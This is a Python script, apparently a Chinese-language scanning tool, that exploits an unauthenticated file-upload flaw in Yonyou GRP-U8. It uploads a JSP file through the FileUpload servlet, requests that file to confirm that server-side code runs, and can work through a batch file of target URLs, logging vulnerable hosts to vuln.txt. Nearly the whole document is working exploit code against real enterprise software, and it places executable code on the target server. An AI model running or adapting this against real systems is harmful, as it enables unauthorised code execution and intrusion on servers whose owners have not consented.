import sys
import argparse
import requests


# 单个漏洞url检查
def jc(url):
    vuln_url = url + "/servlet/FileUpload?fileName=1.jsp&actionID=update"
    ourl = url + "/R9iPortal/upload/1.jsp"
    data = """<% out.println("123");%>"""

    #请求头
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0'
    }

    files = {
        'file': ('1.jsp', data, 'text/plain')
    }

    try:
        # 使用post请求上传文件
        response = requests.post(vuln_url, headers=headers, files=files, timeout=5, verify=False)

        # 检查文件是否上传成功
        if response.status_code == 200:
            check_response = requests.get(ourl, headers=headers, timeout=5, verify=False)
            if '123' in check_response.text:
                print(f"[+] Vulnerability found at: {url}")
                with open("vuln.txt", "a+") as f:
                    f.write(ourl + "\n")
            else:
                print("[-] 未发现漏洞内容或文件内容不匹配")
        else:
            print(f"[-] Failed to upload file. Status code: {response.status_code}")

    except Exception as e:
        print(f"Error occurred: {e}")


# 从文件读取url进行批量检测
def batchCheck(filename):
    with open(filename, "r") as f:
        for line in f.readlines():
            url = line.strip()  # 确保没有额外换行符和空白
            jc(url)  # 给每个url调用检查函数


# 欢迎信息
def banner():
    print("*" * 100)
    print("*" + " YYGRP-U8 漏洞检测工具 ".center(98) + "*")
    print("*" * 100)
    print()
    print("使用指南:".center(100))
    print("单个URL检测".center(100, '-'))
    print(f"[+] 使用命令: {sys.argv[0]} --url http://www.xxx.com".center(100))
    print()
    print("批量检测".center(100, '-'))
    print(f"[+] 从文件检查多个URL: {sys.argv[0]} --file targetUrl.txt".center(100))
    print()
    print("更多帮助信息".center(100, '-'))
    print(f"[+] 获取帮助: {sys.argv[0]} --help".center(100))
    print()
    print("*" * 100)





# 处理函数解析和函数调用的主函数
def main():
    parser = argparse.ArgumentParser(description='用友GRP-U8-UploadFile单批量检测脚本')
    parser.add_argument('-u', '--url', type=str, help='单个检测用法')
    parser.add_argument('-f', '--file', type=str, help='批量检测用法')

    args = parser.parse_args()

    if args.url:
        jc(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()  # 没有提供参数就显示欢迎信息


if __name__ == '__main__':
    main()
